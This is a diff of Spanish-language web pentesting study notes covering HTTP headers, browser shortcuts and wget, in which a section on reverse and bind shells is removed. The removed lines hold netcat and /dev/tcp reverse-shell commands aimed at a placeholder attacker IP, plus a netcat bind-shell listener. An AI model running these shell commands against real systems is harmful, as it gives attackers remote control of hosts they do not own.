@@ -53,7 +53,6 @@ autenticar
 acepte otro tipo de texto como Json
 12. Content-Length: Longitud del contenido
 ## URL-Encode
-* & = %26
 
 ❯ **Ctrl + u** Para ver el código fuente de la pagina web
 ❯ **Ctrl + r** Recargar la pagina web
@@ -111,21 +110,6 @@ acepte otro tipo de texto como Json
 ```bash 
 ❯ wget "http://IP/index"               # Obtenemos el archivo index 'descargamos'
 ```
-
-## ReverShell y BindShell
-Este comando lo ejecutamos desde la pagina web para hacer una **ReverShell** : 
-1) Cuando tenemos Netcat 
-2) Cuando no tenemos Netcat
-```bash 
-❯ nc -e /bin/bash IP-Atacante 443
-
-❯ bash -i >& /dev/tcp/IP-Atacante/443 0>&1
-```
-
-```bash
-❯ nc -nlvp 443 -e /bin/bash              # Ejecutamos desde la pagina web para ponernos en escucha y hacer una **BindShell** :
-```
-
 
 # HTTPS 
 443 - Este puerto es también para la navegación web, pero en este caso usa el protocolo HTTPS que es seguro y utiliza el protocolo TLS por debajo.
